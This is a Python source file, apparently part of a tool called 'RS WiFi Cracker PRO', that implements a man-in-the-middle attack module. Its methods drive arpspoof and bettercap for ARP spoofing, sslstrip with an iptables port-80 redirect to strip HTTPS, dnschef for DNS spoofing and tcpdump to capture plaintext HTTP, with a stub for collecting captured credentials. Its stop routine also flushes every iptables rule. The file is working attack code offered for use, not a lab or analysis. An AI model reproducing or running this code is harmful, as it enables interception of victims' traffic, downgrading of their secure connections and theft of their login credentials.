#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""RS WiFi Cracker PRO - MITM Attack Module"""
import os
import time
import subprocess
import threading
from typing import Optional, List
from datetime import datetime


class MITMAttack:
    """Man-in-the-Middle attack module"""
    
    def __init__(self, interface: str, logger, db=None):
        self.interface = interface
        self.logger = logger
        self.db = db
        self.running = False
        self.captured_data = []
    
    def start_arp_spoof(self, target_ip: str, gateway_ip: str) -> bool:
        """Start ARP spoofing"""
        self.logger.info(f"ARP spoofing {target_ip} -> {gateway_ip}")
        
        try:
            # Enable IP forwarding
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('1')
            
            # Start arpspoof
            self.arp_proc = subprocess.Popen([
                'arpspoof', '-i', self.interface, '-t', target_ip, gateway_ip
            ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            self.running = True
            self.logger.success("ARP spoofing started")
            return True
            
        except FileNotFoundError:
            self.logger.error("arpspoof not found")
            return False
        except Exception as e:
            self.logger.error(f"ARP spoof failed: {e}")
            return False
    
    def start_bettercap(self, targets: str = "local") -> bool:
        """Start bettercap MITM"""
        self.logger.info("Starting bettercap...")
        
        try:
            # Create bettercap script
            script = f"""set net.interface {self.interface}
net.probe on
net.sniff on
set arp.spoof.targets {targets}
arp.spoof on
"""
            
            script_file = "/tmp/bettercap.cap"
            with open(script_file, 'w') as f:
                f.write(script)
            
            self.bettercap_proc = subprocess.Popen([
                'bettercap', '-caplet', script_file
            ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            self.running = True
            self.logger.success("Bettercap started")
            return True
            
        except FileNotFoundError:
            self.logger.error("Bettercap not installed")
            return False
        except Exception as e:
            self.logger.error(f"Bettercap failed: {e}")
            return False
    
    def start_sslstrip(self, port: int = 8080) -> bool:
        """Start SSL strip"""
        self.logger.info("Starting SSL strip...")
        
        try:
            self.sslstrip_proc = subprocess.Popen([
                'sslstrip', '-l', str(port)
            ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            # Redirect HTTP to SSL strip
            subprocess.run([
                'iptables', '-t', 'nat', '-A', 'PREROUTING',
                '-p', 'tcp', '--destination-port', '80',
                '-j', 'REDIRECT', '--to-port', str(port)
            ], capture_output=True)
            
            self.logger.success("SSL strip started")
            return True
            
        except FileNotFoundError:
            self.logger.error("sslstrip not installed")
            return False
        except Exception as e:
            self.logger.error(f"SSL strip failed: {e}")
            return False
    
    def start_dns_spoof(self, domain: str, ip: str) -> bool:
        """Start DNS spoofing"""
        self.logger.info(f"DNS spoofing {domain} -> {ip}")
        
        try:
            # Create dnschef config
            self.dns_proc = subprocess.Popen([
                'dnschef', '--fakeip', ip, '--fakedomains', domain
            ], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            
            self.logger.success("DNS spoofing started")
            return True
            
        except FileNotFoundError:
            self.logger.error("dnschef not installed")
            return False
        except Exception as e:
            self.logger.error(f"DNS spoof failed: {e}")
            return False
    
    def capture_http(self, output_file: str = "/tmp/http_captured.txt"):
        """Capture HTTP traffic"""
        try:
            result = subprocess.run([
                'tcpdump', '-i', self.interface, '-A', '-s', '0',
                'tcp', 'port', '80', '-w', output_file
            ], capture_output=True, text=True)
            
        except Exception as e:
            self.logger.error(f"HTTP capture failed: {e}")
    
    def get_captured_credentials(self) -> List[dict]:
        """Get captured credentials"""
        return self.captured_data
    
    def stop(self):
        """Stop all MITM attacks"""
        self.running = False
        
        for attr in ['arp_proc', 'bettercap_proc', 'sslstrip_proc', 'dns_proc']:
            if hasattr(self, attr):
                proc = getattr(self, attr)
                if proc:
                    proc.terminate()
        
        # Flush iptables
        subprocess.run(['iptables', '-F'], capture_output=True)
        subprocess.run(['iptables', '-t', 'nat', '-F'], capture_output=True)
        
        # Disable IP forwarding
        try:
            with open('/proc/sys/net/ipv4/ip_forward', 'w') as f:
                f.write('0')
        except:
            pass
        
        self.logger.info("MITM attacks stopped")
